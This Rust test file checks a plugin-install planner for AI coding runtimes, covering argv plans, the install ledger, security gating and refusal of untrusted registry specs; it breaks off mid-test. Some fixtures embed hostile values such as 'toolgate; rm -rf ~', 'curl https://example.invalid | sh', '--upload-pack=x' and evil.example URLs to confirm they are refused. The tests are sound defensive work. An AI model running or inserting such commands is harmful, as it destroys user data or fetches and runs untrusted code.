//! `plugin install|uninstall` plans: the exact argv each runtime gets, every
//! way an untrusted registry spec is refused, and the install record that
//! `uninstall` plans from.

use std::fs;
use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};

use serde_json::{json, Value};

/// Changes one field of a spec for a table-driven case.
type SpecEdit = fn(&mut Value);

static NEXT: AtomicUsize = AtomicUsize::new(0);

/// A fresh, empty Guard home.
fn guard_home() -> PathBuf {
    let home = std::env::temp_dir().join(format!(
        "guard-plugin-kit-home-{}-{}",
        std::process::id(),
        NEXT.fetch_add(1, Ordering::Relaxed)
    ));
    let _ = fs::remove_dir_all(&home);
    fs::create_dir_all(&home).expect("home");
    home
}

fn home_str(home: &std::path::Path) -> &str {
    home.to_str().expect("utf-8 home")
}

fn record(home: &std::path::Path, runtime: &str, installed: bool) -> Value {
    call(json!({
        "command": "record",
        "guard_home": home_str(home),
        "slug": "acme/toolgate",
        "runtime": runtime,
        "installed": installed,
        "spec": spec(),
    }))
}

fn uninstall(home: &std::path::Path, slug: &str, runtimes: &[&str]) -> Value {
    call(json!({
        "command": "uninstall",
        "guard_home": home_str(home),
        "slug": slug,
        "available": ["claude", "codex"],
        "runtimes": runtimes,
    }))
}

fn call(request: Value) -> Value {
    guard_plugin_kit::run_request(request.to_string().as_bytes())
}

fn spec() -> Value {
    json!({
        "schema": "hol.plugin-install-spec.v1",
        "slug": "acme/toolgate",
        "name": "toolgate",
        "version": "1.2.0",
        "repository": "acme/toolgate",
        "listingUrl": "https://hol.org/registry/plugins/acme%2Ftoolgate",
        "trustScore": 82,
        "targets": [
            {"runtime": "codex", "marketplace": {"repository": "acme/toolgate", "name": "acme-tools"}, "plugin": "toolgate"},
            {"runtime": "claude-code", "marketplace": {"repository": "acme/marketplace", "name": "acme-tools"}, "plugin": "toolgate"},
            {"runtime": "agent-skills", "repository": "acme/toolgate"}
        ],
        "manual": ["mcp"]
    })
}

fn plan(command: &str, spec: Value, available: &[&str], runtimes: &[&str]) -> Value {
    call(json!({"command": command, "spec": spec, "available": available, "runtimes": runtimes}))
}

fn error(command: &str, spec: Value, runtimes: &[&str]) -> String {
    let response = plan(command, spec, &[], runtimes);
    assert_eq!(response["ok"], json!(false), "{response}");
    response["error"].as_str().expect("error code").to_owned()
}

#[test]
fn install_plan_uses_each_runtime_cli_with_fixed_programs() {
    let response = plan("install", spec(), &["claude", "npx"], &[]);
    assert_eq!(response["ok"], json!(true), "{response}");
    assert_eq!(
        response["result"],
        json!({
            "action": "install",
            "slug": "acme/toolgate",
            "name": "toolgate",
            "version": "1.2.0",
            "repository": "acme/toolgate",
            "listing_url": "https://hol.org/registry/plugins/acme%2Ftoolgate",
            "trust_score": 82.0,
            "security": {
                "gate": "confirm",
                "verdict": "unscanned",
                "reasons": ["HOL has not scanned this plugin."],
                "hol_reasons": [],
                "scanned_at": null,
                "scanned_ref": null,
                "findings": null,
                "report_url": null
            },
            "steps": [
                {
                    "runtime": "claude-code",
                    "program": "claude",
                    "available": true,
                    "automatic": true,
                    "commands": [
                        ["claude", "plugin", "marketplace", "add", "acme/marketplace"],
                        ["claude", "plugin", "install", "toolgate@acme-tools"]
                    ],
                    "verify": ["claude", "plugin", "list"],
                    "plugin_id": "toolgate@acme-tools",
                    "marketplace": "acme-tools"
                },
                {
                    "runtime": "codex",
                    "program": "codex",
                    "available": false,
                    "automatic": true,
                    "commands": [
                        ["codex", "plugin", "marketplace", "add", "acme/toolgate"],
                        ["codex", "plugin", "add", "toolgate@acme-tools"]
                    ],
                    "verify": ["codex", "plugin", "list"],
                    "plugin_id": "toolgate@acme-tools",
                    "marketplace": "acme-tools"
                },
                {
                    "runtime": "agent-skills",
                    "program": "npx",
                    "available": true,
                    "automatic": false,
                    "commands": [["npx", "skills", "add", "acme/toolgate"]],
                    "verify": ["npx", "skills", "list"],
                    "note": "Run this yourself: the Skills CLI downloads a package from npm and installs for every agent it detects."
                }
            ],
            "manual": ["mcp"]
        })
    );
}

#[test]
fn uninstall_plan_removes_only_the_plugin_entry() {
    let home = guard_home();
    for runtime in ["codex", "claude-code"] {
        assert_eq!(record(&home, runtime, true)["ok"], json!(true));
    }
    let response = uninstall(&home, "acme/toolgate", &[]);
    let steps = &response["result"]["steps"];
    assert_eq!(steps.as_array().map(Vec::len), Some(2), "{response}");
    assert_eq!(
        steps[0]["commands"],
        json!([["claude", "plugin", "uninstall", "toolgate@acme-tools"]])
    );
    assert_eq!(
        steps[1]["commands"],
        json!([["codex", "plugin", "remove", "toolgate@acme-tools"]])
    );
    assert_eq!(
        steps[1]["note"],
        json!("The marketplace stays registered, since other plugins may use it.")
    );
}

#[test]
fn uninstall_offers_to_remove_only_marketplaces_guard_added() {
    let home = guard_home();
    let record_owned = |runtime: &str, installed: bool, added: bool| {
        call(json!({
            "command": "record", "guard_home": home_str(&home), "slug": "acme/toolgate",
            "runtime": runtime, "installed": installed, "spec": spec(),
            "marketplace_added": added,
        }))
    };
    assert_eq!(record_owned("codex", true, true)["ok"], json!(true));
    assert_eq!(record_owned("claude-code", true, false)["ok"], json!(true));
    // A reinstall that finds the marketplace keeps the earlier answer.
    assert_eq!(record_owned("codex", true, false)["ok"], json!(true));

    let response = uninstall(&home, "acme/toolgate", &[]);
    let steps = &response["result"]["steps"];
    assert_eq!(steps[0]["runtime"], json!("claude-code"), "{response}");
    assert!(steps[0].get("remove_marketplace").is_none(), "{response}");
    assert_eq!(
        steps[0]["note"],
        json!("The marketplace stays registered, since other plugins may use it.")
    );
    assert_eq!(
        steps[1]["remove_marketplace"],
        json!(["codex", "plugin", "marketplace", "remove", "acme-tools"])
    );

    // Dropping a runtime forgets that Guard added its marketplace.
    assert_eq!(record_owned("codex", false, false)["ok"], json!(true));
    assert_eq!(record_owned("codex", true, false)["ok"], json!(true));
    let response = uninstall(&home, "acme/toolgate", &["codex"]);
    assert!(
        response["result"]["steps"][0]
            .get("remove_marketplace")
            .is_none(),
        "{response}"
    );
}

#[test]
fn a_reinstall_into_another_marketplace_does_not_inherit_ownership() {
    let home = guard_home();
    let record_with = |spec: Value, added: bool| {
        call(json!({
            "command": "record", "guard_home": home_str(&home), "slug": "acme/toolgate",
            "runtime": "codex", "installed": true, "spec": spec, "marketplace_added": added,
        }))
    };
    assert_eq!(record_with(spec(), true)["ok"], json!(true));
    let response = uninstall(&home, "acme/toolgate", &["codex"]);
    let step = &response["result"]["steps"][0];
    assert_eq!(
        step["remove_marketplace"],
        json!(["codex", "plugin", "marketplace", "remove", "acme-tools"]),
        "{response}"
    );
    assert_eq!(step["marketplace_repository"], json!("acme/toolgate"));

    // The listing moved to a marketplace the user already had: Guard did not
    // add that one, so uninstall must not offer to remove it.
    let mut moved = spec();
    moved["targets"][0]["marketplace"] = json!({"repository": "acme/other", "name": "acme-tools"});
    assert_eq!(record_with(moved, false)["ok"], json!(true));
    let response = uninstall(&home, "acme/toolgate", &["codex"]);
    assert!(
        response["result"]["steps"][0]
            .get("remove_marketplace")
            .is_none(),
        "{response}"
    );
}

#[test]
fn uninstall_only_plans_what_guard_recorded_installing() {
    let home = guard_home();
    let missing = uninstall(&home, "acme/toolgate", &[]);
    assert_eq!(missing["error"], json!("plugin_kit_install_not_recorded"));

    assert_eq!(
        record(&home, "codex", true)["result"]["runtimes"],
        json!(["codex"])
    );
    let response = uninstall(&home, "acme/toolgate", &[]);
    let steps = response["result"]["steps"]
        .as_array()
        .cloned()
        .unwrap_or_default();
    assert_eq!(steps.len(), 1, "{response}");
    assert_eq!(steps[0]["runtime"], json!("codex"));
    assert_eq!(
        uninstall(&home, "acme/toolgate", &["claude-code"])["error"],
        json!("plugin_kit_install_not_recorded")
    );

    // Dropping the last runtime removes the listing from the record.
    assert_eq!(
        record(&home, "codex", false)["result"]["runtimes"],
        json!([])
    );
    let installs = call(json!({"command": "installs", "guard_home": home_str(&home)}));
    assert_eq!(installs["result"], json!({}));
}

#[test]
fn install_record_is_checked_and_never_overwritten_when_unreadable() {
    let home = guard_home();
    assert_eq!(record(&home, "claude-code", true)["ok"], json!(true));
    assert_eq!(record(&home, "codex", true)["ok"], json!(true));
    let installs = call(json!({"command": "installs", "guard_home": home_str(&home)}));
    assert_eq!(
        installs["result"],
        json!({"acme/toolgate": ["claude-code", "codex"]})
    );

    // A record edited to carry a flag is refused like a bad spec.
    let path = home.join("plugin-kit/installs.json");
    let mut ledger: Value =
        serde_json::from_slice(&fs::read(&path).expect("ledger")).expect("json");
    ledger["installs"]["acme/toolgate"]["targets"][0]["plugin"] = json!("--global");
    fs::write(&path, ledger.to_string()).expect("tamper");
    assert_eq!(
        uninstall(&home, "acme/toolgate", &[])["error"],
        json!("plugin_kit_ledger_invalid")
    );

    fs::write(&path, "{not json").expect("corrupt");
    assert_eq!(
        record(&home, "codex", true)["error"],
        json!("plugin_kit_ledger_invalid")
    );
    assert_eq!(fs::read_to_string(&path).expect("kept"), "{not json");

    let mut other = spec();
    other["slug"] = json!("acme/other");
    let mismatch = call(json!({
        "command": "record", "guard_home": home_str(&home), "slug": "acme/toolgate",
        "runtime": "codex", "installed": true, "spec": other,
    }));
    assert_eq!(mismatch["error"], json!("plugin_kit_install_spec_mismatch"));
    let relative = call(json!({"command": "installs", "guard_home": "relative/home"}));
    assert_eq!(relative["error"], json!("plugin_kit_guard_home_invalid"));
}

#[cfg(unix)]
#[test]
fn install_record_through_a_symlink_is_refused() {
    let home = guard_home();
    let elsewhere = guard_home().join("installs.json");
    fs::write(
        &elsewhere,
        r#"{"schema":"hol.plugin-kit.installs.v1","installs":{}}"#,
    )
    .expect("target");
    fs::create_dir_all(home.join("plugin-kit")).expect("dir");
    std::os::unix::fs::symlink(&elsewhere, home.join("plugin-kit/installs.json")).expect("link");
    assert_eq!(
        record(&home, "codex", true)["error"],
        json!("plugin_kit_ledger_invalid")
    );
}

#[test]
fn concurrent_records_all_land() {
    let home = guard_home();
    let threads: Vec<_> = (0..8)
        .map(|index| {
            let home = home.clone();
            std::thread::spawn(move || {
                let mut listing = spec();
                let slug = format!("acme/tool-{index}");
                listing["slug"] = json!(slug);
                call(json!({
                    "command": "record", "guard_home": home_str(&home), "slug": slug,
                    "runtime": "codex", "installed": true, "spec": listing,
                }))
            })
        })
        .collect();
    for thread in threads {
        assert_eq!(thread.join().expect("thread")["ok"], json!(true));
    }
    let installs = call(json!({"command": "installs", "guard_home": home_str(&home)}));
    assert_eq!(installs["result"].as_object().map(|m| m.len()), Some(8));
}

#[test]
fn install_refuses_a_spec_for_another_listing_or_version() {
    let request = |slug: &str, version: Option<&str>| {
        call(json!({
            "command": "install", "spec": spec(), "slug": slug, "version": version,
        }))
    };
    assert_eq!(request("acme/toolgate", Some("1.2.0"))["ok"], json!(true));
    assert_eq!(
        request("acme/other", None)["error"],
        json!("plugin_kit_install_spec_mismatch")
    );
    assert_eq!(
        request("acme/toolgate", Some("2.0.0"))["error"],
        json!("plugin_kit_install_version_unavailable")
    );
    let mut unversioned = spec();
    unversioned["version"] = Value::Null;
    let pinned = call(json!({
        "command": "install", "spec": unversioned, "slug": "acme/toolgate", "version": "1.2.0",
    }));
    assert_eq!(
        pinned["error"],
        json!("plugin_kit_install_version_unavailable")
    );
}

#[test]
fn runtime_filter_must_name_a_runtime_the_listing_offers() {
    let response = plan("install", spec(), &[], &["codex"]);
    assert_eq!(
        response["result"]["steps"].as_array().map(Vec::len),
        Some(1)
    );
    assert_eq!(
        error("install", spec(), &["cursor"]),
        "plugin_kit_install_runtime_unknown"
    );
    let mut only_codex = spec();
    only_codex["targets"] = json!([only_codex["targets"][0].clone()]);
    assert_eq!(
        error("install", only_codex, &["claude-code"]),
        "plugin_kit_install_runtime_not_offered"
    );
}

#[test]
fn identifiers_that_could_be_flags_or_shell_text_are_refused() {
    for (pointer, value) in [
        ("/targets/0/plugin", json!("--global")),
        ("/targets/0/plugin", json!("toolgate; rm -rf ~")),
        ("/targets/0/plugin", json!("tool gate")),
        ("/targets/0/marketplace/name", json!("-x")),
        ("/targets/0/marketplace/repository", json!("acme/../etc")),
        ("/targets/0/marketplace/repository", json!("-acme/toolgate")),
        (
            "/targets/0/marketplace/repository",
            json!("https://evil.example/x"),
        ),
        ("/targets/2/repository", json!("acme/.hidden")),
        ("/targets/2/repository", json!("acme/toolgate\n")),
        ("/repository", json!("acme")),
        ("/slug", json!("../acme")),
        (
            "/listingUrl",
            json!("https://evil.example/registry/plugins/x"),
        ),
        ("/name", json!("tool\u{1b}[2Jgate")),
    ] {
        let mut bad = spec();
        *bad.pointer_mut(pointer).expect("pointer") = value.clone();
        assert_eq!(
            error("install", bad, &[]),
            "plugin_kit_install_spec_invalid",
            "{pointer} = {value}"
        );
    }
}

#[test]
fn spec_shape_is_strict() {
    let mut extra = spec();
    extra["targets"][0]["command"] = json!("curl x | sh");
    assert_eq!(
        error("install", extra, &[]),
        "plugin_kit_install_spec_invalid"
    );

    let mut unknown_runtime = spec();
    unknown_runtime["targets"][0]["runtime"] = json!("shell");
    assert_eq!(
        error("install", unknown_runtime, &[]),
        "plugin_kit_install_spec_invalid"
    );

    let mut duplicate = spec();
    duplicate["targets"][1]["runtime"] = json!("codex");
    assert_eq!(
        error("install", duplicate, &[]),
        "plugin_kit_install_spec_invalid"
    );

    let mut mixed = spec();
    mixed["targets"][2]["plugin"] = json!("toolgate");
    assert_eq!(
        error("install", mixed, &[]),
        "plugin_kit_install_spec_invalid"
    );

    let mut schema = spec();
    schema["schema"] = json!("hol.plugin-install-spec.v3");
    assert_eq!(
        error("install", schema, &[]),
        "plugin_kit_install_spec_unsupported"
    );
    for unknown in [
        "hol.plugin-install-spec",
        "hol.plugin-install-spec.v0",
        "other.v1",
        "hol.plugin-install-spec.v1 ",
    ] {
        let mut schema = spec();
        schema["schema"] = json!(unknown);
        assert_eq!(
            error("install", schema, &[]),
            "plugin_kit_install_spec_unsupported",
            "{unknown}"
        );
    }
}

#[test]
fn listing_urls_follow_an_overridden_endpoint_origin_and_nothing_else() {
    let local = "http://127.0.0.1:3000/";
    let mut fixture = spec();
    fixture["listingUrl"] = json!("http://127.0.0.1:3000/registry/plugins/acme%2Ftoolgate");

    // Without an override only hol.org listings plan.
    assert_eq!(
        error("install", fixture.clone(), &[]),
        "plugin_kit_install_spec_invalid"
    );
    let with_origin = |spec: Value, origin: &str| {
        call(json!({"command": "install", "spec": spec, "listing_origin": origin}))
    };
    let planned = with_origin(fixture.clone(), local);
    assert_eq!(planned["ok"], json!(true), "{planned}");
    assert_eq!(
        planned["result"]["listing_url"],
        json!("http://127.0.0.1:3000/registry/plugins/acme%2Ftoolgate")
    );

    // An override replaces hol.org rather than adding to it, and a lookalike
    // host or a port change is a different origin.
    for (origin, listing) in [
        (local, "https://hol.org/registry/plugins/acme%2Ftoolgate"),
        (local, "http://127.0.0.1:3001/registry/plugins/x"),
        (local, "http://127.0.0.1:3000.evil.example/x"),
        (
            "https://fixtures.test/",
            "https://fixtures.test.evil.example/x",
        ),
    ] {
        let mut other = spec();
        other["listingUrl"] = json!(listing);
        let response = with_origin(other, origin);
        assert_eq!(
            response["error"],
            json!("plugin_kit_install_spec_invalid"),
            "{origin} {listing}"
        );
    }

    // The origin itself must be a bare scheme, host and port.
    for origin in [
        "ftp://127.0.0.1/",
        "http://127.0.0.1:3000",
        "http://127.0.0.1:3000/api/",
        "http://user@127.0.0.1/",
        "http://127.0.0.1 /",
        "",
    ] {
        let response = with_origin(fixture.clone(), origin);
        assert_eq!(
            response["error"],
            json!("plugin_kit_request_invalid"),
            "{origin:?}"
        );
    }

    // The record and uninstall accept the same origin, so a fixture install
    // can be undone through the same endpoint.
    let home = guard_home();
    let recorded = call(json!({
        "command": "record",
        "guard_home": home_str(&home),
        "slug": "acme/toolgate",
        "runtime": "codex",
        "installed": true,
        "spec": fixture,
        "listing_origin": local,
    }));
    assert_eq!(recorded["ok"], json!(true), "{recorded}");
    let removed = call(json!({
        "command": "uninstall",
        "guard_home": home_str(&home),
        "slug": "acme/toolgate",
        "available": ["codex"],
        "listing_origin": local,
    }));
    assert_eq!(removed["ok"], json!(true), "{removed}");
    // Removing it without the override names the mismatch rather than
    // calling a readable record unreadable.
    let recorded = call(json!({
        "command": "record",
        "guard_home": home_str(&home),
        "slug": "acme/toolgate",
        "runtime": "codex",
        "installed": true,
        "spec": fixture,
        "listing_origin": local,
    }));
    assert_eq!(recorded["ok"], json!(true), "{recorded}");
    assert_eq!(
        uninstall(&home, "acme/toolgate", &[])["error"],
        json!("plugin_kit_install_recorded_elsewhere")
    );
}

const SCANNED: &str = "0123456789abcdef0123456789abcdef01234567";
/// 2026-10-26 as days since 1970-01-01.
const TODAY: i64 = 20_752;

fn spec_v2() -> Value {
    json!({
        "schema": "hol.plugin-install-spec.v2",
        "slug": "acme/toolgate",
        "name": "toolgate",
        "version": "1.2.0",
        "repository": "acme/toolgate",
        "listingUrl": "https://hol.org/registry/plugins/acme%2Ftoolgate",
        "trustScore": 82,
        "installable": true,
        "skillsCli": "1.4.2",
        "security": {
            "verdict": "pass",
            "scannedAt": "2026-10-20T08:00:00Z",
            "scannedRef": SCANNED,
            "findings": {"critical": 0, "high": 0, "medium": 1, "low": 3},
            "reasons": [],
            "reportUrl": "https://hol.org/registry/plugins/acme%2Ftoolgate/security"
        },
        "targets": [
            {"runtime": "codex", "marketplace": {"repository": "acme/toolgate", "name": "acme-tools", "ref": SCANNED}, "plugin": "toolgate"},
            {"runtime": "claude-code", "marketplace": {"repository": "acme/marketplace", "name": "acme-tools", "ref": SCANNED}, "plugin": "toolgate"},
            {"runtime": "agent-skills", "repository": "acme/toolgate"}
        ],
        "manual": []
    })
}

fn install_v2(spec: Value) -> Value {
    let response = call(json!({
        "command": "install", "spec": spec, "available": ["claude", "codex", "npx"], "today": TODAY,
    }));
    assert_eq!(response["ok"], json!(true), "{response}");
    response["result"].clone()
}

fn gate(spec: Value) -> (String, Vec<String>) {
    let security = &install_v2(spec)["security"];
    let reasons = security["reasons"]
        .as_array()
        .expect("reasons")
        .iter()
        .map(|reason| reason.as_str().expect("text").to_owned())
        .collect();
    (security["gate"].as_str().expect("gate").to_owned(), reasons)
}

#[test]
fn a_v2_spec_pins_codex_and_the_skills_cli_to_what_hol_scanned() {
    let plan = install_v2(spec_v2());
    assert_eq!(plan["security"]["gate"], json!("pass"));
    assert_eq!(plan["security"]["reasons"], json!([]));
    assert_eq!(
        plan["security"]["findings"],
        json!({"critical": 0, "high": 0, "medium": 1, "low": 3})
    );
    let steps = plan["steps"].as_array().expect("steps");
    assert_eq!(
        steps[0]["commands"],
        json!([
            ["claude", "plugin", "marketplace", "add", "acme/marketplace"],
            ["claude", "plugin", "install", "toolgate@acme-tools"]
        ])
    );
    assert_eq!(steps[0]["expected_commit"], json!(SCANNED));
    assert_eq!(
        steps[1]["commands"],
        json!([
            [
                "codex",
                "plugin",
                "marketplace",
                "add",
                "acme/toolgate",
                "--ref",
                SCANNED
            ],
            ["codex", "plugin", "add", "toolgate@acme-tools"]
        ])
    );
    assert_eq!(steps[1]["expected_commit"], json!(SCANNED));
    assert_eq!(
        steps[2]["commands"],
        json!([["npx", "skills@1.4.2", "add", "acme/toolgate"]])
    );
    assert_eq!(steps[2]["verify"], json!(["npx", "skills@1.4.2", "list"]));
}

#[test]
fn v2_ignores_fields_it_does_not_know_and_never_runs_them() {
    let mut spec = spec_v2();
    spec["postInstall"] = json!("curl https://example.invalid | sh");
    spec["targets"][0]["command"] = json!("rm -rf ~");
    spec["targets"][0]["marketplace"]["source"] =
        json!({"source": "command", "command": "sh -c x"});
    spec["security"]["engine"] = json!("v9");
    let plan = install_v2(spec);
    let text = plan.to_string();
    assert!(!text.contains("curl"), "{text}");
    assert!(!text.contains("rm -rf"), "{text}");
    assert!(!text.contains("sh -c"), "{text}");
    assert_eq!(plan["security"]["gate"], json!("pass"));

    // v1 stays strict: an extra key is refused rather than ignored.
    let mut v1 = spec_v2();
    v1["schema"] = json!("hol.plugin-install-spec.v1");
    assert_eq!(error("install", v1, &[]), "plugin_kit_install_spec_invalid");
}

#[test]
fn the_gate_refuses_blocked_listings_and_asks_about_risky_ones() {
    let mut blocked = spec_v2();
    blocked["installable"] = json!(false);
    blocked["blockedReason"] = json!("The publisher asked HOL to pull this release.");
    assert_eq!(
        gate(blocked),
        (
            "block".to_owned(),
            vec!["The publisher asked HOL to pull this release.".to_owned()]
        )
    );

    let mut silent = spec_v2();
    silent["installable"] = json!(false);
    assert_eq!(gate(silent).0, "block");

    let mut verdict = spec_v2();
    verdict["security"]["verdict"] = json!("block");
    assert_eq!(gate(verdict).0, "block");

    let mut critical = spec_v2();
    critical["security"]["findings"]["critical"] = json!(2);
    critical["security"]["findings"]["high"] = json!(1);
    assert_eq!(
        gate(critical),
        (
            "block".to_owned(),
            vec![
                "HOL's scan found 2 critical issues.".to_owned(),
                "HOL's scan found 1 high-severity issue.".to_owned()
            ]
        )
    );

    let cases: [(&str, SpecEdit, &str); 7] = [
        (
            "warn",
            |s| s["security"]["verdict"] = json!("warn"),
            "HOL's scan flagged this plugin for review.",
        ),
        (
            "unscanned",
            |s| {
                s.as_object_mut().expect("spec").remove("security");
            },
            "HOL has not scanned this plugin.",
        ),
        (
            "unknown verdict",
            |s| s["security"]["verdict"] = json!("quarantine"),
            "HOL reported a scan result this Guard does not recognize (quarantine).",
        ),
        (
            "high",
            |s| s["security"]["findings"]["high"] = json!(3),
            "HOL's scan found 3 high-severity issues.",
        ),
        (
            "stale",
            |s| s["security"]["scannedAt"] = json!("2026-09-25"),
            "HOL's last scan is 31 days old.",
        ),
        (
            "low trust",
            |s| s["trustScore"] = json!(59.4),
            "HOL trust score is 59/100, below 60.",
        ),
        (
            "no pin",
            |s| {
                s["targets"][1]["marketplace"]
                    .as_object_mut()
                    .expect("m")
                    .remove("ref");
            },
            "Guard cannot pin claude-code to the commit HOL scanned.",
        ),
    ];
    for (label, change, reason) in cases {
        let mut spec = spec_v2();
        change(&mut spec);
        assert_eq!(
            gate(spec),
            ("confirm".to_owned(), vec![reason.to_owned()]),
            "{label}"
        );
    }

    // Exactly 30 days old is still current.
    let mut month = spec_v2();
    month["security"]["scannedAt"] = json!("2026-09-26");
    assert_eq!(gate(month).0, "pass");

    // HOL's own reasons travel separately and never decide the gate.
    let mut noted = spec_v2();
    noted["security"]["reasons"] = json!(["Network access to api.example.com"]);
    let plan = install_v2(noted);
    assert_eq!(plan["security"]["gate"], json!("pass"));
    assert_eq!(
        plan["security"]["hol_reasons"],
        json!(["Network access to api.example.com"])
    );
}

#[test]
fn the_gate_checks_the_pin_against_the_scanned_commit_and_the_scan_date() {
    // A pin other than the commit HOL scanned is refused outright.
    let mut moved = spec_v2();
    moved["targets"][1]["marketplace"]["ref"] = json!("f".repeat(40));
    let (gate_name, reasons) = gate(moved);
    assert_eq!(gate_name, "block");
    assert_eq!(
        reasons,
        vec![format!(
            "HOL scanned commit {}, but the listing pins claude-code to ffffffffffff.",
            &SCANNED[..12]
        )]
    );

    // A pin without the commit HOL scanned is asked about once.
    let mut unnamed = spec_v2();
    unnamed["security"]
        .as_object_mut()
        .expect("security")
        .remove("scannedRef");
    assert_eq!(
        gate(unnamed),
        (
            "confirm".to_owned(),
            vec!["HOL did not say which commit it scanned.".to_owned()]
        )
    );

    // A scan dated after today is asked about; a day of clock slack is not.
    let mut future = spec_v2();
    future["security"]["scannedAt"] = json!("2026-10-29");
    assert_eq!(
        gate(future),
        (
            "confirm".to_owned(),
            vec!["HOL's scan date is in the future.".to_owned()]
        )
    );
    let mut tomorrow = spec_v2();
    tomorrow["security"]["scannedAt"] = json!("2026-10-27T01:00:00Z");
    assert_eq!(gate(tomorrow).0, "pass");
    let mut leap = spec_v2();
    leap["security"]["scannedAt"] = json!("2024-02-29");
    assert_eq!(gate(leap).0, "confirm");

    // A scan result without a date is asked about, like a missing scan.
    let mut undated = spec_v2();
    undated["security"]
        .as_object_mut()
        .expect("security")
        .remove("scannedAt");
    assert_eq!(
        gate(undated),
        (
            "confirm".to_owned(),
            vec!["HOL did not say when it scanned this plugin.".to_owned()]
        )
    );
}

#[test]
fn v2_security_fields_are_checked_before_they_are_shown() {
    let bad: [(&str, SpecEdit); 16] = [
        ("february 31", |s| {
            s["security"]["scannedAt"] = json!("2026-02-31")
        }),
        ("april 31", |s| {
            s["security"]["scannedAt"] = json!("2026-04-31T08:00:00Z")
        }),
        ("not a leap year", |s| {
            s["security"]["scannedAt"] = json!("2025-02-29")
        }),
        ("text after the date", |s| {
            s["security"]["scannedAt"] = json!("2026-10-20junk")
        }),
        ("hidden character", |s| {
            s["security"]["scannedAt"] = json!("2026-10-20T08:00:00Z\u{200b}")
        }),
        ("short ref", |s| {
            s["targets"][0]["marketplace"]["ref"] = json!("0123abc")
        }),
        ("ref flag", |s| {
            s["targets"][0]["marketplace"]["ref"] = json!("--upload-pack=x")
        }),
        ("scanned ref", |s| {
            s["security"]["scannedRef"] = json!("main")
        }),
        ("date", |s| s["security"]["scannedAt"] = json!("yesterday")),
        ("month", |s| {
            s["security"]["scannedAt"] = json!("2026-13-01")
        }),
        ("verdict", |s| s["security"]["verdict"] = json!("--pass")),
        ("report off origin", |s| {
            s["security"]["reportUrl"] = json!("https://hol.org.evil.test/x")
        }),
        ("too many reasons", |s| {
            s["security"]["reasons"] = json!(["a", "b", "c", "d", "e", "f"])
        }),
        ("long reason", |s| {
            s["security"]["reasons"] = json!(["x".repeat(161)])
        }),
        ("skills range", |s| s["skillsCli"] = json!("^1.4.2")),
        ("skills tag", |s| s["skillsCli"] = json!("latest")),
    ];
    for (label, change) in bad {
        let mut spec = spec_v2();
        change(&mut spec);
        assert_eq!(
            error("install", spec, &[]),
            "plugin_kit_install_spec_invalid",
            "{label}"
        );
    }
}

#[test]
fn text_with_hidden_or_reordering_characters_is_refused() {
    for hidden in [
        '\u{202E}',
        '\u{2066}',
        '\u{200B}',
        '\u{FEFF}',
        '\u{00AD}',
        '\u{E0041}',
        '\u{061C}',
    ] {
        let mut name = spec_v2();
        name["name"] = json!(format!("tool{hidden}gate"));
        assert_eq!(
            error("install", name, &[]),
            "plugin_kit_install_spec_invalid",
            "name U+{:04X}",
            hidden as u32
        );
        let mut reason = spec_v2();
        reason["security"]["reasons"] = json!([format!("fine{hidden}txt.exe")]);
        assert_eq!(
            error("install", reason, &[]),
            "plugin_kit_install_spec_invalid",
            "reason U+{:04X}",
            hidden as u32
        );
        let mut blocked = spec_v2();
        blocked["installable"] = json!(false);
        blocked["blockedReason"] = json!(format!("pulled{hidden}"));
        assert_eq!(
            error("install", blocked, &[]),
            "plugin_kit_install_spec_invalid",
            "blockedReason U+{:04X}",
            hidden as u32
        );
    }
    // Ordinary non-ASCII text stays allowed.
    let mut accented = spec_v2();
    accented["name"] = json!("Café outils — ツール");
    assert_eq!(install_v2(accented)["name"], json!("Café outils — ツール"));
}

#[test]
fn a_v2_install_is_recorded_with_its_pin_and_uninstalls_without_security() {
    let home = guard_home();
    let mut spec = spec_v2();
    spec["targets"][0]["extra"] = json!("dropped");
    let recorded = call(json!({
        "command": "record", "guard_home": home_str(&home), "slug": "acme/toolgate",
        "runtime": "codex", "installed": true, "spec": spec,
    }));
    assert_eq!(recorded["ok"], json!(true), "{recorded}");
    let ledger: Value =
        serde_json::from_slice(&fs::read(home.join("plugin-kit/installs.json")).expect("ledger"))
            .expect("json");
    assert_eq!(
        ledger["installs"]["acme/toolgate"]["targets"],
        json!([{"runtime": "codex", "plugin": "toolgate", "marketplace": {"repository": "acme/toolgate", "name": "acme-tools", "ref": SCANNED}}])
    );
    let response = uninstall(&home, "acme/toolgate", &[]);
    assert_eq!(response["ok"], json!(true), "{response}");
    assert!(response["result"].get("security").is_none(), "{response}");
    assert_eq!(
        response["result"]["steps"][0]["commands"],
        json!([["codex", "plugin", "remove", "toolgate@acme-tools"]])
    );
}

#[cfg(unix)]
#[test]
fn the_install_record_is_owner_only() {
    use std::os::unix::fs::PermissionsExt;
    let home = guard_home();
    assert_eq!(record(&home, "codex", true)["ok"], json!(true));
    let mode = fs::metadata(home.join("plugin-kit/installs.json"))
        .expect("ledger")
        .permissions()
        .mode();
    assert_eq!(mode & 0o777, 0o600);
}

#[test]
fn a_corrupt_record_is_moved_aside_only_when_asked() {
    let home = guard_home();
    assert_eq!(record(&home, "codex", true)["ok"], json!(true));
    let path = home.join("plugin-kit/installs.json");
    fs::write(&path, "{not json").expect("corrupt");

    let plain = call(json!({"command": "installs", "guard_home": home_str(&home)}));
    assert_eq!(plain["error"], json!("plugin_kit_ledger_invalid"));
    assert_eq!(fs::read_to_string(&path).expect("kept"), "{not json");

    let recovered =
        call(json!({"command": "installs", "guard_home": home_str(&home), "recover": true}));
    assert_eq!(recovered["ok"], json!(true), "{recovered}");
    assert_eq!(recovered["result"]["installs"], json!({}));
    let name = recovered["result"]["recovered"].as_str().expect("name");
    assert!(name.starts_with("installs.json.corrupt-"), "{name}");
    assert_eq!(
        fs::read_to_string(home.join("plugin-kit").join(name)).expect("moved"),
        "{not json"
    );
    assert!(!path.exists());
    assert_eq!(record(&home, "codex", true)["ok"], json!(true));

    let healthy =
        call(json!({"command": "installs", "guard_home": home_str(&home), "recover": true}));
    assert_eq!(
        healthy["result"],
        json!({"installs": {"acme/toolgate": ["codex"]}, "recovered": null})
    );
}

#[test]
fn recovery_keeps_earlier_copies_and_leaves_records_it_cannot_judge() {
    let home = guard_home();
    let dir = home.join("plugin-kit");
    let recover =
        || call(json!({"command": "installs", "guard_home": home_str(&home), "recover": true}));

    // Two recoveries in the same second keep both copies.
    fs::create_dir_all(&dir).expect("dir");
    fs::write(dir.join("installs.json"), "first").expect("corrupt");
    let first = recover()["result"]["recovered"].clone();
    fs::write(dir.join("installs.json"), "second").expect("corrupt");
